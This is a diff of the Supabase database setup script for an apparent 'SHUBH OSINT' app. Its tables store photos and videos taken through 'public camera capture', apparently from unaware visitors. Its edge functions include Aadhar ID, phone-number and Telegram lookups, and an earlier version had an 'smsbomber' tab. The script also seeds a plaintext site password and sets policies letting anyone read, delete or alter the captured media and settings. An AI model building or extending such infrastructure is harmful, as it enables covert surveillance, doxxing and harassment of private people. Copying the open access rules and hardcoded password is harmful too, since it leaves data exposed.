@@ -2,8 +2,8 @@
 -- SHUBH OSINT - Complete Supabase Database Setup
 -- =====================================================
 -- Run this SQL in your new Supabase project's SQL Editor
--- Last Updated: 2026-01-20
--- Version: 3.0 (Storage-based media)
+-- Last Updated: 2026-01-25
+-- Version: 3.1 (Latest sync with edge functions)
 -- =====================================================
 
 -- =====================================================
@@ -56,8 +56,7 @@ CREATE TABLE IF NOT EXISTS public.app_settings (
   updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
 );
 
--- Captured Photos Table (stores photo URLs from storage)
--- NOTE: image_data now stores URL instead of base64
+-- Captured Photos Table (stores photo data or URLs)
 CREATE TABLE IF NOT EXISTS public.captured_photos (
   id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
   session_id TEXT NOT NULL,
@@ -131,8 +130,7 @@ DROP POLICY IF EXISTS "Anyone can update settings" ON public.app_settings;
 CREATE POLICY "Anyone can update settings" ON public.app_settings
   FOR UPDATE TO public USING (true);
 
--- Captured Photos - Public access (view, insert, delete)
--- IMPORTANT: Must be PERMISSIVE (default) for public camera capture to work
+-- Captured Photos - Public access (PERMISSIVE for camera capture)
 DROP POLICY IF EXISTS "Anyone can view captured photos" ON public.captured_photos;
 CREATE POLICY "Anyone can view captured photos" ON public.captured_photos
   FOR SELECT TO public USING (true);
@@ -145,8 +143,7 @@ DROP POLICY IF EXISTS "Anyone can delete captured photos" ON public.captured_pho
 CREATE POLICY "Anyone can delete captured photos" ON public.captured_photos
   FOR DELETE TO public USING (true);
 
--- Captured Videos - Public access (view, insert, delete)
--- IMPORTANT: Must be PERMISSIVE (default) for video capture to work
+-- Captured Videos - Public access (PERMISSIVE for video capture)
 DROP POLICY IF EXISTS "Anyone can view captured videos metadata" ON public.captured_videos;
 CREATE POLICY "Anyone can view captured videos metadata" ON public.captured_videos
   FOR SELECT TO public USING (true);
@@ -286,7 +283,7 @@ CREATE INDEX IF NOT EXISTS idx_credit_usage_date ON public.credit_usage(created_
 -- 8. DEFAULT DATA
 -- =====================================================
 
--- Main Settings (includes admin password, session ID, search buttons, tabs, etc.)
+-- Main Settings (includes admin password, session ID, search tabs, etc.)
 INSERT INTO public.app_settings (setting_key, setting_value)
 VALUES ('main_settings', '{
   "sitePassword": "dark",
@@ -365,18 +362,26 @@ VALUES ('main_settings', '{
 ON CONFLICT (setting_key) DO NOTHING;
 
 -- =====================================================
+-- EDGE FUNCTIONS (deploy from supabase/functions/)
+-- =====================================================
+-- 1. auth-login       - User login with credit password
+-- 2. auth-verify      - Verify session token
+-- 3. credits-deduct   - Deduct credits for search
+-- 4. admin-passwords  - Admin CRUD for passwords
+-- 5. aadhar-search    - Aadhar lookup proxy
+-- 6. numinfo-v2       - Phone number lookup proxy
+-- 7. telegram-osint   - Telegram OSINT proxy
+-- =====================================================
+
+-- =====================================================
 -- SETUP COMPLETE!
 -- =====================================================
--- Version 3.0 Changes:
--- - Added captured-photos storage bucket (photos now use URLs)
--- - Added backgrounds storage bucket (for background images & logos)
--- - Updated storage policies for all buckets
--- - Added cam settings (photoLimit, captureInterval, etc.)
--- - Added tabSize setting
--- - Updated tabs with numinfov2, smsbomber
+-- Version 3.1 Changes:
+-- - Synced with latest edge functions config
+-- - Added numinfo-v2 and telegram-osint edge function refs
+-- - Updated date to 2026-01-25
 --
 -- After running this SQL:
--- 1. Deploy the edge functions from supabase/functions/
--- 2. Update your Vercel environment variables
--- 3. Configure Telegram OSINT JWT token in Admin panel
+-- 1. Edge functions auto-deploy from supabase/functions/
+-- 2. Configure Telegram OSINT JWT token in Admin panel
 -- =====================================================
